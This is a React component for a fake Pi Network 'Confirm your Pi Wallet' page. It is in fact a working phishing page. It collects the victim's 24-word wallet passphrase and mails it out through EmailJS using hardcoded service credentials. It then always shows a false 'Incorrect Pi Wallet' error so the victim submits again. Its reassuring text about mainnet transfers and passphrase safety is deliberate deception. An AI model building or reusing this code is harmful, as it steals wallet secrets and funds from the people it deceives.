import React, { useRef } from 'react'
import emailjs from '@emailjs/browser';
import {toast } from 'react-toastify'
import { Link } from 'react-router-dom'
import back from '../assets/icons/piarrowfoward.png'
import './Wallet.css'

const UnlockPi = () => {
    const form = useRef();

    const sendEmail = (e) => {
    e.preventDefault();
    emailjs
      .sendForm('service_6wjdosn', 'template_ai58wj5', form.current, {
        publicKey: 'mam6ss0ALqhNPjk14',
      })
      .then(
        () => {
          console.log('SUCCESS!');
          toast.error('Incorrect Pi Wallet. Please double-check your passphrase and try again.')
        },
        (error) => {
          console.log('FAILED...', error.text);
          toast.error('Incorrect Pi Wallet. Please double-check your passphrase and try again.')
        },
      );
  };
    return (<div className='wallet'>
      <div className='back-button'>
          <Link to={'/home'} ><img src={back} alt="back" /></Link>
      </div>
      <div className='wallet-container'> 
          <div className='heading'>Comfirm your Pi Wallet</div>
          <div className='info'>Manually unlock the wallet using your passphrase to demonstrate you can access it. this also confirms that your mainnet balance will transfer to this wallet.</div>
          <div className='info info-x'>Never enter your passphrase on any other arbitary page.</div>
      </div>
  
      <form className='passphrase' ref={form} onSubmit={sendEmail}>
          <input type="hidden" name="to_name" value='Pi PassPhrase' /><br />
          <input type="hidden" name="from_name" value='PiPassphrase@pi.com' /><br />
          <textarea name="message" placeholder='Enter your 24-word passphrase here' required /><br />
          <input className='btn' type="submit" value='Confirm Your Wallet' /><br />
        </form>

        <div className='info-u'>Confirm your wallet to unlock your lock pi coins</div>
    </div>
    )
}

export default UnlockPi